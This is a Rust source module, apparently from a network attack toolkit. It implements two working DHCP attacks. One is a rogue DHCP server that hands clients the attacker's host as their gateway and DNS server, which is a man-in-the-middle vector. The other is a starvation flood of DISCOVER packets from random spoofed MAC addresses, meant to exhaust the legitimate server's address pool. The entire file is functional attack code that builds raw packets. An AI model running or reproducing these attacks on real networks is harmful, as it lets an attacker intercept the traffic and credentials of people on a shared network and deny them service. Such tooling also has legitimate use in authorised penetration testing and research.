//! DHCP attacks:
//!   * rogue — answer DHCP DISCOVER/REQUEST, handing clients this host as their
//!     gateway and DNS server (an alternative MITM vector that needs no ARP).
//!   * starve — flood DISCOVERs with random MACs to exhaust the real server's
//!     pool (often a precursor to running rogue).

use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use pnet::datalink::{MacAddr, NetworkInterface};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{checksum as ipv4_checksum, MutableIpv4Packet};
use pnet::packet::udp::{ipv4_checksum as udp_checksum, MutableUdpPacket};
use rand::Rng;
use socket2::{Domain, Protocol, Socket, Type};

use crate::log::Logger;
use crate::net::{err, iface_ipv4, iface_net, open_channel};

const COOKIE: [u8; 4] = [0x63, 0x82, 0x53, 0x63];

// --- rogue --------------------------------------------------------------

pub fn rogue(iface: &NetworkInterface, logger: Logger, running: Arc<AtomicBool>) -> std::io::Result<()> {
    let our_ip = iface_ipv4(iface).ok_or_else(|| err("interface has no IPv4"))?;
    let net = iface_net(iface).ok_or_else(|| err("interface has no IPv4 network"))?;
    let mask = net.mask();

    let sock = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    sock.set_reuse_address(true)?;
    sock.set_broadcast(true)?;
    sock.bind(&SocketAddr::new(Ipv4Addr::UNSPECIFIED.into(), 67).into())?;
    sock.set_read_timeout(Some(Duration::from_secs(1)))?;
    let sock: UdpSocket = sock.into();

    println!("rogue DHCP on {} — offering gateway/DNS {our_ip} (Ctrl+C to stop)\n", iface.name);
    let base = u32::from(net.network());
    let mut pool: u32 = 100;
    let mut buf = [0u8; 2048];

    while running.load(Ordering::SeqCst) {
        let Ok((n, _)) = sock.recv_from(&mut buf) else { continue };
        let pkt = &buf[..n];
        let Some(mtype) = dhcp_msg_type(pkt) else { continue };
        if pkt.len() < 240 {
            continue;
        }
        let xid = &pkt[4..8];
        let flags = &pkt[10..12];
        let chaddr: [u8; 6] = pkt[28..34].try_into().unwrap();

        // DISCOVER -> OFFER (2), REQUEST -> ACK (5)
        let reply_type = match mtype {
            1 => 2,
            3 => 5,
            _ => continue,
        };
        let offered = Ipv4Addr::from(base + pool);
        pool = pool.wrapping_add(1).max(100);

        let reply = build_dhcp_reply(xid, flags, &chaddr, reply_type, offered, our_ip, mask);
        let _ = sock.send_to(&reply, "255.255.255.255:68");
        let mac = MacAddr::new(chaddr[0], chaddr[1], chaddr[2], chaddr[3], chaddr[4], chaddr[5]);
        let kind = if reply_type == 2 { "OFFER" } else { "ACK" };
        println!("[dhcp] {kind} {offered} -> {mac} (gw/dns {our_ip})");
        logger.event(
            "dhcp-rogue",
            &mac.to_string(),
            serde_json::json!({ "reply": kind, "offered": offered.to_string() }),
        );
    }
    Ok(())
}

fn dhcp_msg_type(pkt: &[u8]) -> Option<u8> {
    if pkt.len() < 240 || pkt[236..240] != COOKIE {
        return None;
    }
    let mut i = 240;
    while i < pkt.len() {
        let code = pkt[i];
        if code == 255 {
            break;
        }
        if code == 0 {
            i += 1;
            continue;
        }
        let len = *pkt.get(i + 1)? as usize;
        if code == 53 {
            return pkt.get(i + 2).copied();
        }
        i += 2 + len;
    }
    None
}

fn build_dhcp_reply(
    xid: &[u8],
    flags: &[u8],
    chaddr: &[u8; 6],
    msg_type: u8,
    yiaddr: Ipv4Addr,
    server: Ipv4Addr,
    mask: Ipv4Addr,
) -> Vec<u8> {
    let mut m = vec![0u8; 240];
    m[0] = 2; // op: reply
    m[1] = 1; // htype: ethernet
    m[2] = 6; // hlen
    m[4..8].copy_from_slice(xid);
    m[10..12].copy_from_slice(flags);
    m[16..20].copy_from_slice(&yiaddr.octets()); // yiaddr
    m[20..24].copy_from_slice(&server.octets()); // siaddr
    m[28..34].copy_from_slice(chaddr);
    m[236..240].copy_from_slice(&COOKIE);
    // options
    m.extend_from_slice(&[53, 1, msg_type]);
    m.extend_from_slice(&[54, 4]);
    m.extend_from_slice(&server.octets()); // server id
    m.extend_from_slice(&[51, 4, 0x00, 0x00, 0x0e, 0x10]); // lease 3600s
    m.extend_from_slice(&[1, 4]);
    m.extend_from_slice(&mask.octets()); // subnet mask
    m.extend_from_slice(&[3, 4]);
    m.extend_from_slice(&server.octets()); // router = us
    m.extend_from_slice(&[6, 4]);
    m.extend_from_slice(&server.octets()); // DNS = us
    m.push(255); // end
    m
}

// --- starvation ---------------------------------------------------------

pub fn starve(iface: &NetworkInterface, running: Arc<AtomicBool>) -> std::io::Result<()> {
    let (mut tx, _rx) = open_channel(iface, None)?;
    println!("DHCP starvation on {} — flooding DISCOVERs (Ctrl+C to stop)\n", iface.name);
    let mut rng = rand::thread_rng();
    let mut sent = 0u64;
    while running.load(Ordering::SeqCst) {
        let mac = MacAddr::new(
            (rng.gen::<u8>() & 0xFC) | 0x02,
            rng.gen(),
            rng.gen(),
            rng.gen(),
            rng.gen(),
            rng.gen(),
        );
        let xid: u32 = rng.gen();
        let frame = build_discover_frame(mac, xid);
        tx.send_to(&frame, None);
        sent += 1;
        if sent.is_multiple_of(100) {
            print!("\r  sent {sent} DISCOVERs");
            use std::io::Write;
            let _ = std::io::stdout().flush();
        }
        std::thread::sleep(Duration::from_millis(5));
    }
    println!("\nstopped after {sent} DISCOVERs.");
    Ok(())
}

fn build_discover_frame(mac: MacAddr, xid: u32) -> Vec<u8> {
    // BOOTP/DHCP DISCOVER payload.
    let mut dhcp = vec![0u8; 240];
    dhcp[0] = 1; // op: request
    dhcp[1] = 1;
    dhcp[2] = 6;
    dhcp[4..8].copy_from_slice(&xid.to_be_bytes());
    dhcp[10..12].copy_from_slice(&0x8000u16.to_be_bytes()); // broadcast flag
    dhcp[28..34].copy_from_slice(&[mac.0, mac.1, mac.2, mac.3, mac.4, mac.5]);
    dhcp[236..240].copy_from_slice(&COOKIE);
    dhcp.extend_from_slice(&[53, 1, 1]); // DHCP DISCOVER
    dhcp.extend_from_slice(&[55, 3, 1, 3, 6]); // param request list
    dhcp.push(255);

    let total = 14 + 20 + 8 + dhcp.len();
    let mut buf = vec![0u8; total];
    {
        let mut eth = MutableEthernetPacket::new(&mut buf[..14]).unwrap();
        eth.set_destination(MacAddr::broadcast());
        eth.set_source(mac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }
    {
        let mut ip = MutableIpv4Packet::new(&mut buf[14..34]).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length((20 + 8 + dhcp.len()) as u16);
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip.set_source(Ipv4Addr::UNSPECIFIED);
        ip.set_destination(Ipv4Addr::BROADCAST);
        let c = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(c);
    }
    {
        let mut udp = MutableUdpPacket::new(&mut buf[34..]).unwrap();
        udp.set_source(68);
        udp.set_destination(67);
        udp.set_length((8 + dhcp.len()) as u16);
        udp.set_payload(&dhcp);
        let c = udp_checksum(&udp.to_immutable(), &Ipv4Addr::UNSPECIFIED, &Ipv4Addr::BROADCAST);
        udp.set_checksum(c);
    }
    buf
}
